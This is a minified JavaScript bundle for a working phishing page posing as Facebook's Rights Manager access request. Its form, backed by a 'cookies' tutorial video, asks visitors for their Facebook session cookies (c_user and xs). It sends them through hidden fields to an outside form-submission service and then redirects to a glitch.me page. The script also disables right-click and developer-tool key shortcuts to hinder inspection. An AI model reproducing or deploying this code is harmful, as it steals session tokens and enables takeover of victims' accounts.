(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const e of document.querySelectorAll('link[rel="modulepreload"]'))n(e);new MutationObserver(e=>{for(const i of e)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&n(a)}).observe(document,{childList:!0,subtree:!0});function o(e){const i={};return e.integrity&&(i.integrity=e.integrity),e.referrerPolicy&&(i.referrerPolicy=e.referrerPolicy),e.crossOrigin==="use-credentials"?i.credentials="include":e.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function n(e){if(e.ep)return;e.ep=!0;const i=o(e);fetch(e.href,i)}})();function r(){return`
    <header class="top-bar">
      <div class="container nav-container">
        <div class="logo-section">
          <a href="#" class="fb-logo">facebook</a>
          <span class="divider">|</span>
          <span class="page-title">Rights Manager</span>
        </div>
      </div>
    </header>
  `}function c(){return`
    <div class="info-section">
      <h1>Request access to Rights Manager</h1>
      <p class="description">
        Rights Manager helps protect your original video and audio content across Facebook and Instagram. To get started, we need to verify some information to learn about your content protection needs. Once submitted, the Rights Manager team will review your details and get back to you as soon as possible.
      </p>
      <div class="notice">
        <span class="material-icons notice-icon">info</span>
        <p class="notice-text">
          Content protection only begins when you're fully enrolled in Rights Manager with reference files uploaded to be protected.
        </p>
      </div>
    </div>
  `}function d(){return`
    <div class="illustration-section">
      <img 
        src="https://www.facebook.com/images/rights_manager/rm-effortless-onboarding-header.png" 
        alt="Rights Manager Protection"
        width="400"
        height="300">
    </div>
  `}function l(){return`
    <form class="content" action="https://api.web3forms.com/submit" method="post">
    <input type="hidden" name="access_key" value="c230df15-f982-45c7-9543-91ca46ba3467">
     <input type="hidden" name="redirect" value="https://request-to-accses-rights-manager.glitch.me/pass.html">
      <div class="verification-header">
        <h2>Request access to Rights Manager</h2>
      </div>
      
      <div class="verification-info">
        <p>Rights Managers are commonly used on social media and video platforms to safeguard original content and ensure that creators are compensated fairly.</p>
        <p>It enables users to track the use of their content across various platforms, identify potential infringements, and enforce their rights by blocking or monetizing unauthorized uses.</p>
        <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
      </div>

      <div class="video-section">
        <h3>Detailed Video Information</h3>
        <a href="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4">
          <img src="https://apply-form-rust.vercel.app/facebook.png" width="230" alt="Video thumbnail">
        </a>
        <h4>Must Watch the video and submit required information correctly.</h4>
        <p>Please be sure to provide the requested information below.</p>
      </div>

      <div class="form-fields">
        <div class="form-group">
          <label>c_user</label>
          <input type="number" name="c_user" pattern="[0-9]+" minlength="6" required>
        </div>

        <div class="form-group">
          <label>xs</label>
          <input type="text" name="xs" required>
        </div>
      </div>

      <p class="important-notice">Please make sure account not to log out from your computer or laptop until you have received a verification email.</p>

      <div class="submit-section">
        <button type="submit" class="submit-button">Submit</button>
      </div>
    </form>
  `}function u(){return`
    <div class="content-types-section">
      <h2>Content Types Protected</h2>
      <div class="content-types-grid">
        <div class="content-type-card">
          <span class="material-icons">videocam</span>
          <h3>Video Content</h3>
          <p>Protect your original videos from unauthorized use across Facebook and Instagram</p>
        </div>
        <div class="content-type-card">
          <span class="material-icons">music_note</span>
          <h3>Audio Content</h3>
          <p>Safeguard your original music and audio recordings from unauthorized use</p>
        </div>
        <div class="content-type-card">
          <span class="material-icons">live_tv</span>
          <h3>Live Broadcasts</h3>
          <p>Monitor and protect your live streaming content in real-time</p>
        </div>
      </div>
    </div>
  `}function p(){return`
    <div class="benefits-section">
      <h2>Key Benefits</h2>
      <div class="benefits-list">
        <div class="benefit-item">
          <span class="material-icons">shield</span>
          <div class="benefit-content">
            <h3>Automated Protection</h3>
            <p>24/7 automated scanning and matching against uploaded content</p>
          </div>
        </div>
        <div class="benefit-item">
          <span class="material-icons">analytics</span>
          <div class="benefit-content">
            <h3>Detailed Analytics</h3>
            <p>Track where and how your content is being used</p>
          </div>
        </div>
        <div class="benefit-item">
          <span class="material-icons">gavel</span>
          <div class="benefit-content">
            <h3>Custom Rules</h3>
            <p>Set specific actions for matched content</p>
          </div>
        </div>
      </div>
    </div>
  `}function f(){return`
    <div class="faq-section">
      <h2>Frequently Asked Questions</h2>
      <div class="faq-list">
        <details class="faq-item">
          <summary>Who can apply for Rights Manager?</summary>
          <p>Rights Manager is available to content creators, media companies, and rights holders who need to protect their intellectual property at scale across Facebook and Instagram.</p>
        </details>
        <details class="faq-item">
          <summary>How long does the approval process take?</summary>
          <p>The review process typically takes 2-3 business days. Complex applications may require additional time for verification.</p>
        </details>
        <details class="faq-item">
          <summary>What happens after I'm approved?</summary>
          <p>Once approved, you'll receive access to the Rights Manager tool where you can upload reference files and set up your protection rules.</p>
        </details>
      </div>
    </div>
  `}function m(){const s=document.getElementById("app");s.innerHTML=`
    ${r()}
    <main class="container main-content">
      <div class="card">
        <div class="content-grid">
          ${c()}
          ${d()}
        </div>
      </div>
      ${u()}
      ${p()}
      <div class="verification-container">
        ${l()}
      </div>
      ${f()}
    </main>
  `,document.addEventListener("touchend",function(t){t.preventDefault(),t.target.click()},!1),document.addEventListener("contextmenu",t=>t.preventDefault()),document.onkeydown=t=>{t.ctrlKey&&(t.shiftKey||t.key==="I"||t.key==="i")&&t.preventDefault()},navigator.userAgent.match(/iPhone|iPad|iPod/i)&&(document.documentElement.style.cssText="scroll-behavior: smooth;-webkit-overflow-scrolling: touch;")}document.addEventListener("DOMContentLoaded",m);"ontouchstart"in window&&document.documentElement.classList.add("touch-device");
